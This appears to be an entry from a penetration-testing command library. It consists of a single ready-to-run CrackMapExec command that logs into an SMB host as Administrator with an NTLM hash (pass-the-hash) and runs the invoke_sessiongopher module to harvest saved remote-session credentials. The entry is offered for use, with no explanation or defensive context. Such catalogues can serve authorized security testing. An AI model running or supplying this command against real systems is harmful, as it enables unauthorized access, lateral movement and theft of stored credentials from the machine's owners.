---
id: 1f73429b-7415-4ac2-ad0e-4eeb8f3660c6
name: Execute smb module with domain and module name
type: command
executor: bash
data: root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f'
  -d 'DOMAIN' -M invoke_sessiongopher
output: null
created_at: '2023-04-06T03:56:01.851478+00:00'
updated_at: '2023-04-10T20:25:48.419627+00:00'
---

# Execute smb module with domain and module name

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
```


